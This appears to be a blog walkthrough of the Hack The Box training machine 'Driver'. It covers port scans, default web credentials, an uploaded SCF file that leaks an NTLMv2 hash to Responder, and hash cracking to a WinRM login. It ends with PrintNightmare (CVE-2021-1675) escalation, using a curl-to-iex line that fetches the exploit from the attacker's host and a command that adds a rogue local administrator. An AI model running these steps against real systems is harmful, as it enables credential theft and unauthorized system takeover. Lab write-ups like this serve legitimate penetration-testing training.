---
title: "HTB Driver"
date: 2026-05-16 11:27 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Easy]
image: /assets/img/posts/driver/driver.png
---
**HTB Driver** is a Windows machine that starts with default credentials on a `MFP Firmware Update Center` web portal, uploads a malicious `SCF` file to capture an `NTLMv2` hash via `Responder`, cracks it to authenticate as `tony` via `WinRM`, and escalates to `Administrator` by exploiting `PrintNightmare` (`CVE-2021-1675`) to add a new local administrator account.

## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.95.238 --min-rate 1000 -nv
```
```
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
5985/tcp open  wsman
```
- NSE Scripts & Version
```
nmap -sCV -p80,135,5985 10.129.95.238 --min-rate 1000 -nv
```
```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc   Microsoft Windows RPC
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Web
### default creds
![web](/assets/img/posts/driver/page.png)
Based on the headers in the response, the username is `admin`, and after testing default credentials, it appears that `admin` is the valid account.
### responder
![page2](/assets/img/posts/driver/page2.png)
The credentials work, and this endpoint `fw_up.php` tells us to select a printer and firmware update, so we know that Windows, of course, loves NTLM. We’ll upload a file that, when opened, will trigger a connection back to our machine.
```
sudo responder -I tun0 -wF -v
```
we will upload an icon file `file.scf` that will connect back into our Responder.
```
[Shell]    
Command=2    
IconFile=\\10.10.14.186\HelloWorld,3
```
![page2](/assets/img/posts/driver/page3.png)
```
hashcat -a 0 -m 5600 hash.txt rockyou.txt -d 1 -O
```
```
tony:liltony
```
## shell as tony

```
➜  Driver nxc smb 10.129.95.238 -u 'tony' -p 'liltony'                                                          
SMB         10.129.95.238   445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.129.95.238   445    DRIVER           [+] DRIVER\tony:liltony 
➜  Driver nxc smb 10.129.95.238 -u 'tony' -p 'liltony' --shares
SMB         10.129.95.238   445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.129.95.238   445    DRIVER           [+] DRIVER\tony:liltony 
SMB         10.129.95.238   445    DRIVER           [*] Enumerated shares
SMB         10.129.95.238   445    DRIVER           Share           Permissions     Remark
SMB         10.129.95.238   445    DRIVER           -----           -----------     ------
SMB         10.129.95.238   445    DRIVER           ADMIN$                          Remote Admin
SMB         10.129.95.238   445    DRIVER           C$                              Default share
SMB         10.129.95.238   445    DRIVER           IPC$            READ            Remote IPC
➜  Driver nxc winrm 10.129.95.238 -u 'tony' -p 'liltony'     
WINRM       10.129.95.238   5985   DRIVER           [*] Windows 10 Build 10240 (name:DRIVER) (domain:DRIVER) 
WINRM       10.129.95.238   5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
```
```
evil-winrm -i 10.129.95.238 -u 'tony' -p 'liltony'
```
### PrintNightmare
[0xdf-blog](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)
```
git clone https://github.com/calebstewart/CVE-2021-1675
mv CVE-2021-1675 invoke-nightmare
upload invoke-nightmare/CVE-2021-1675.ps1
```
```
-WinRM* PS C:\ProgramData> Import-Module .\CVE-2021-1675.ps1
File C:\ProgramData\CVE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ Import-Module .\CVE-2021-1675.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
```
```
*Evil-WinRM* PS C:\ProgramData> curl 10.10.14.186:9999/CVE-2021-1675.ps1 -UseBasicParsing | iex
*Evil-WinRM* PS C:\ProgramData> menu
```
```
[+] Add-Win32Type
[+] field
[+] func
[+] get_nightmare_dll
[+] Invoke-Nightmare
[+] New-InMemoryModule
[+] psenum
[+] struct
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] clear
[+] cls
[+] menu
[+] exit
```
```
*Evil-WinRM* PS C:\ProgramData> Invoke-Nightmare -NewUser "hoxon" -NewPassword "P@ssw0rd2026"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user hoxon as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
*Evil-WinRM* PS C:\ProgramData> 
```
```
➜  Driver evil-winrm -i 10.129.95.238 -u 'hoxon' -p 'P@ssw0rd2026'
*Evil-WinRM* PS C:\Users\hoxon\Documents> type /users/administrator/desktop/root.txt
```

